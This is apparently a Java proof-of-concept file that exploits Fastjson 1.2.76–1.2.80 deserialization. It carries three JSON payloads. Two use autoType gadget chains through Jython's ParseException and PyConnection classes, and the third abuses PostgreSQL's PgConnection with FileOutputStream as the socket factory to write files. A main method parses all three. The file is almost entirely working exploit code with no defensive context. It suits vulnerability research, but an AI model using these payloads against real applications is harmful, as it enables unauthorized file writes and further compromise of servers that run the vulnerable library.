package test;
import com.alibaba.fastjson.JSON;

public class Fastjson32_python_pgsql {
    public static void main(String[] args){

        //依赖1.2.76-1.2.80，依赖rhq-scripting-python-4.13.0(非常冷门)/postgresql-42.3.1，pgsql可替换为mysql
        String poc1 ="{\r\n"
        		+ "	\"@type\":\"java.lang.Exception\",\r\n"
        		+ "    \"@type\":\"org.python.antlr.ParseException\"\r\n"
        		+ "}";


    String poc2 = "{\r\n"
    		+ "	\"@type\": \"java.lang.Class\",\r\n"
    		+ "	\"val\": {\r\n"
    		+ "		\"@type\": \"java.lang.String\" {\r\n"
    		+ "			\"@type\": \"java.util.Locale\",\r\n"
    		+ "			\"val\": {\r\n"
    		+ "				\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
    		+ "				{\r\n"
    		+ "					\"@type\": \"java.lang.String\"\r\n"
    		+ "					\"@type\": \"org.python.antlr.ParseException\",\r\n"
    		+ "					\"type\": \"{\\\"@type\\\":\\\"com.ziclix.python.sql.PyConnection\\\",\\\"connection\\\":{\\\"@type\\\":\\\"org.postgresql.jdbc.PgConnection\\\"}}\"\r\n"
    		+ "				}\r\n"
    		+ "			}\r\n"
    		+ "		}\r\n"
    		+ "	}\r\n"
    		+ "}";

   String poc3 = "{\r\n"
   		+ "	\"@type\": \"org.postgresql.jdbc.PgConnection\",\r\n"
   		+ "	\"hostSpecs\": [{\r\n"
   		+ "		\"host\": \"127.0.0.1\",\r\n"
   		+ "		\"port\": 2333\r\n"
   		+ "	}],\r\n"
   		+ "	\"user\": \"test\",\r\n"
   		+ "	\"database\": \"test\",\r\n"
   		+ "	\"info\": {\r\n"
   		+ "		\"socketFactory\": \"java.io.FileOutputStream\",\r\n"
   		+ "		\"socketFactoryArg\": \"1.txt\"\r\n"
   		+ "	},\r\n"
   		+ "	\"url\": \"\"\r\n"
   		+ "}";
   
   
   
       System.out.println(poc1);
       System.out.println(poc2);
       System.out.println(poc3);
       
       JSON.parseObject(poc1);
       try {
    	   JSON.parseObject(poc2);
	} catch (Exception e) {
		// TODO: handle exception
	}
    	   
       JSON.parseObject(poc3);
       
    }
}
